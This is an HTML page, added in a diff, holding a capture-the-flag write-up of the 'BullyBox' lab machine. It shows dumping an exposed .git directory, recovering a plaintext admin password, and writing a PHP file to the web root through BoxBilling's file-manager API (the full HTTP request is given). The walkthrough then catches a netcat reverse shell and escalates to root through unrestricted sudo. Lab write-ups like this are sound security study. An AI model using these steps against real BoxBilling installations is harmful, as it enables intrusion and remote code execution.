@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BullyBox &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>BullyBox</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">git</span><span class="tag">GitDumper</span><span class="tag">BoxBilling</span><span class="tag">FileUpload</span><span class="tag">RCE</span><span class="tag">sudo</span><span class="tag">credentialhunting</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#discovering-the-exposed-git-directory">Discovering the Exposed .git Directory</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#credentials-in-bb-config-php">Credentials in bb-config.php</a><a class="lvl3" href="#php-webshell-via-the-file-manager-api">PHP Webshell via the File Manager API</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#unconstrained-sudo">Unconstrained sudo</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>BullyBox is a Linux web box running BoxBilling, a PHP billing platform. The site redirects to <code>bullybox.local</code>, and directory brute force reveals a <code>.git</code> folder that is forbidden at the browser but extractable with GitDumper. Inside the dumped repository, <code>bb-config.php</code> contains the database password, which doubles as the admin panel credential. BoxBilling's authenticated file manager accepts PHP uploads through its API, landing a shell as <code>yuki</code>. That user has unconstrained <code>sudo</code> rights, making privilege escalation trivial.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+</code></pre>
+<p>The page at the IP fails to load and redirects to <code>http://bullybox.local/</code>. After adding that to <code>/etc/hosts</code>, it resolves to a BoxBilling storefront.</p>
+<h3 id="discovering-the-exposed-git-directory">Discovering the Exposed .git Directory</h3>
+<p>Direct browser access to <code>/.git/</code> returns 403 Forbidden, Apache blocks directory listing but the files are still served individually. That's enough for GitDumper:</p>
+<pre><code class="language-sh">python3 git_dumper.py http://bullybox.local/.git/ ./bully
+</code></pre>
+<blockquote>
+<p><strong>Why a forbidden .git still leaks code:</strong> Apache's 403 blocks index listing, but individual file paths like <code>/.git/config</code>, <code>/.git/HEAD</code>, and pack files are still readable. GitDumper reconstructs the full repository tree by crawling known git object paths. Any committed file becomes recoverable, including configs with secrets.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="credentials-in-bb-config-php">Credentials in bb-config.php</h3>
+<p>Inside the dumped repository, <code>bb-config.php</code> holds the database configuration in plaintext:</p>
+<pre><code class="language-php">'type'     =&gt; 'mysql',
+'host'     =&gt; 'localhost',
+'name'     =&gt; 'boxbilling',
+'user'     =&gt; 'admin',
+'password' =&gt; 'Playing-Unstylish7-Provided',
+</code></pre>
+<p>The comment in <code>bb-config-sample.php</code> points to the admin panel path:</p>
+<pre><code>http://www.yourdomain.com/index.php?_url=/bb-admin
+</code></pre>
+<p>Logging into <code>/bb-admin</code> with <code>admin@bullybox.local:Playing-Unstylish7-Provided</code> succeeds.</p>
+<h3 id="php-webshell-via-the-file-manager-api">PHP Webshell via the File Manager API</h3>
+<p>BoxBilling exposes a <code>Filemanager/save_file</code> endpoint that authenticated admins can call directly. The endpoint writes arbitrary content to a specified path:</p>
+<pre><code class="language-http">POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
+Host: bullybox.local
+Cookie: PHPSESSID=8f22hpf0mgvb1jqr5a68m6pkcs
+Content-Type: application/x-www-form-urlencoded
+
+order_id=1&amp;path=ax.php&amp;data=&lt;%3fphp+phpinfo()%3b%3f&gt;
+</code></pre>
+<p>Visiting <code>http://bullybox.local/ax.php</code> returns a phpinfo page, confirming write access to the web root.</p>
+<blockquote>
+<p><strong>Why this works:</strong> the file manager API validates the session token but places no restriction on file extension or content. Passing <code>path=shell.php</code> with a URL-encoded PHP reverse shell in <code>data</code> writes an executable .php file directly into the document root.</p>
+</blockquote>
+<p>The same request with the Ivan Sincek PHP reverse shell payload in <code>data</code> (URL-encoded) and <code>path=shell.php</code> lands a shell on port 80:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.27] 52730
+SOCKET: Shell has connected! PID: 2136
+
+whoami
+yuki
+</code></pre>
+<p>Upgrade to TTY:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="unconstrained-sudo">Unconstrained sudo</h3>
+<p><code>sudo -l</code> shows the full picture immediately:</p>
+<pre><code class="language-sh">yuki@bullybox:/tmp$ sudo -l
+User yuki may run the following commands on bullybox:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+</code></pre>
+<p><code>yuki</code> can run anything as any user without a password.</p>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">yuki@bullybox:/tmp$ sudo /bin/bash
+root@bullybox:/tmp# whoami
+root
+</code></pre>
+<pre><code class="language-sh">root@bullybox:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>A 403 on <code>.git/</code> is not protection.</strong> GitDumper extracts full source code from individually accessible objects. Check for <code>.git</code> on every engagement and treat a 403 response as "likely recoverable, not blocked."</li>
+<li><strong>Config files committed to git are permanent liabilities.</strong> Even after a repo is cleaned up, secrets in git history persist. Here the live config file was committed as-is.</li>
+<li><strong>Always check <code>sudo -l</code> immediately after foothold.</strong> Completely unrestricted sudo is rare, but it costs one command to verify and ends the engagement on the spot.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
